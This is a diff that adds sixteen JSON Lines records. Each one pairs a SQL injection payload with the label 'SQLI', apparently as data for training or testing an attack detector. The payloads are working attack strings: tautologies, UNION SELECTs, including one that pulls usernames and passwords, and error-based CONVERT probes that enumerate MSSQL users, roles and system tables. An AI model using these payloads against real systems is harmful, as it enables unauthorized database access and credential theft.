+{"payload": "' OR '1'='1", "attack_type": "SQLI"}
+{"payload": "' AND '1'='1", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT username, password FROM users--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null, null--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT @@version))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT user_name()))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT db_name()))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT host_name()))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT current_user))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT SYSTEM_USER))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT IS_SRVROLEMEMBER('sysadmin')))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysdatabases))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='U'))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='P'))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='V'))--", "attack_type": "SQLI"}
